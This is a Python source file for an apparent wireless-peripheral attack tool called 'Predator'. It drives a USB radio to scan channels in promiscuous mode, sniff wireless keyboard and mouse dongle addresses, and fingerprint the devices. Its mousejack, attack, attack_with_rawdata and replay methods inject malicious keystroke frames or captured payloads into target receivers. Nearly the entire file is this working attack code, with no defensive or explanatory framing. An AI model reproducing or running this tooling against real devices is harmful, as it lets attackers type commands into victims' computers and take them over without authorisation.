import usb
import time
from six import iteritems
from datetime import datetime
from Script.Plugins import FingerprintRegistry, DriverRegistry

PING = [0x0f, 0x0f, 0x0f, 0x0f]
CHANNEL_DWELL_TIME = 0.1


class Predator(object):
    def __init__(self, vid, pid, activate_lna: object = True):
        self.driver_key = f'{vid}_{pid}'
        self.drivers = DriverRegistry.discover_drivers()
        self.radios = None
        self.channel = None
        self.channels = range(2, 84)
        self.channel_index = 0
        self.ping = PING
        self.devices = {}
        self.HID = list(FingerprintRegistry.discover().values())
        self.init_radio(activate_lna)
        self.scan_active = False

    def close(self):
        if self.radios and hasattr(self.radios, 'device'):
            usb.util.dispose_resources(self.radios.device)

    @staticmethod
    def str_to_hex(data):
        return [int(b, 16) for b in data.split(':')]

    @staticmethod
    def hex_to_str(data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def init_radio(self, activate_lna):
        try:
            self.radios = self.drivers[self.driver_key](0)
            if activate_lna:
                self.radios.activate_LNA()
            return True, "Radio initialized successfully"
        except Exception as ex:
            return False, f"Initialization failed: {ex}"

    def device_detected(self, address, payload):
        channel = self.channels[self.channel_index]
        timestamp = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = timestamp
            if channel not in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.devices[address]['device'] is None:
                self.devices[address]['device'] = self.get_hid(payload)
            self.devices[address]['payload'] = payload

        else:
            self.devices[address] = {}
            self.devices[address]['index'] = len(self.devices)
            self.devices[address]['count'] = 1
            self.devices[address]['timestamp'] = timestamp
            self.devices[address]['channels'] = [self.channels[self.channel_index]]
            self.devices[address]['address'] = self.str_to_hex(address)[::-1]
            self.devices[address]['device'] = self.get_hid(payload)
            self.devices[address]['payload'] = payload

    def clear_devices(self):
        self.devices = {}
        return

    def scan(self, generic=False, timeout=0.5, callback=None):
        if generic:
            self.radios.activate_promiscuous_mode_generic()
        else:
            self.radios.activate_promiscuous_mode()

        last_tune = time.time()
        start_time = time.time()

        self.radios.set_channel(self.channels[self.channel_index])

        if len(self.channels) > 1:
            while time.time() - start_time < timeout:
                if time.time() - last_tune > CHANNEL_DWELL_TIME:
                    self.channel_index = (self.channel_index + 1) % len(self.channels)
                    self.radios.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()
                # data handling
                try:
                    data = self.radios.recv_payload()
                except RuntimeError:
                    data = []

                if len(data) >= 5:
                    address, payload = data[0:5], data[5:]
                    if callback:
                        callback(address, payload)
                    else:
                        self.device_detected(self.hex_to_str(address), payload)

            return self.devices

    def sniff(self, timeout, addr_string, callback=None):
        address = self.str_to_hex(addr_string)[::-1]
        self.radios.activate_sniffer_mode(address)
        self.channel_index = 0
        self.radios.set_channel(self.channels[self.channel_index])

        last_ping = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_ping > CHANNEL_DWELL_TIME:
                if not self.radios.send_payload(self.ping, 1, 1):
                    for self.channel_index in range(len(self.channels)):
                        self.radios.set_channel(self.channels[self.channel_index])
                        if self.radios.send_payload(self.ping, 1, 1):
                            last_ping = time.time()
                            break
                else:
                    last_ping = time.time()
            try:
                data = self.radios.recv_payload()
            except RuntimeError:
                data = [1]

            if data[0] == 0:
                last_ping = time.time() + 5.0
                payload = data[1:]

                if callback:
                    callback(address, payload)
                else:
                    self.device_detected(addr_string, payload)

        return self.devices

    def sniffer_mode(self, address):
        self.radios.activate_sniffer_mode(address)

    def find_channel(self, address):
        self.radios.activate_sniffer_mode(address)
        for channel in self.channels:
            self.radios.set_channel(channel)
            if self.radios.send_payload(self.ping):
                return channel
        return None

    def set_channel(self, channel):
        self.channel = channel
        self.radios.set_channel(channel)

    def get_hid(self, payload):
        if not payload:
            return None
        for hid in self.HID:
            if hid.fingerprint(payload):
                return hid
        return None

    def send_payload(self, payload):
        return self.radios.send_payload(payload)

    def attack(self, hid, mal_command):
        hid.build_frames(mal_command)
        for key in mal_command:
            if key['frames']:
                for frame in key['frames']:
                    self.send_payload(frame[0])
                    time.sleep(frame[1] / 1000)

    def mousejack(self, targets, mal_code):
        for addr_string, target in iteritems(targets):
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            hid = target['device']
            self.sniffer_mode(address)
            if hid:
                for channel in channels:
                    self.set_channel(channel)
                    self.attack(hid(address, payload), mal_code)

    def attack_with_rawdata(self, targets, payload):
        for address, target in iteritems(targets):
            payload = list(payload)
            channels = target['channels']
            address = target['address']
            self.radios.activate_sniffer_mode(address)
            for channel in channels:
                self.radios.set_channel(channel)
                for rawdata in payload:
                    self.radios.send_payload(list(rawdata))

    @staticmethod
    def report_address(targets):
        addresses = []
        for address, target in iteritems(targets):
            address = target['address']
            addresses.append(address)
        return addresses

    @staticmethod
    def report_channels(targets):
        channels = []
        for address, target in iteritems(targets):
            channel = target['channels']
            channels.append(channel)
        return channels

    @staticmethod
    def report_hid(targets):
        hids = []
        for address, target in iteritems(targets):
            hid = target['device']
            if hid:
                hids.append(hid)
        if len(hids) > 0:
            return hids
        else:
            return 'Unknown'

    def replay(self, targets):
        for address, target in iteritems(targets):
            payload = list(target['payload'])
            channels = target['channels']
            address = target['address']
            self.radios.activate_sniffer_mode(address)
            for channel in channels:
                self.radios.set_channel(channel)
                self.radios.send_payload(payload)

    @staticmethod
    def get_payload(targets):
        payloads = []
        for address, target in iteritems(targets):
            payload = list(target['payload'])
            payload_hex = ':'.join(f'{byte:02X}' for byte in payload)
            payloads.append(payload_hex)
        return payloads




















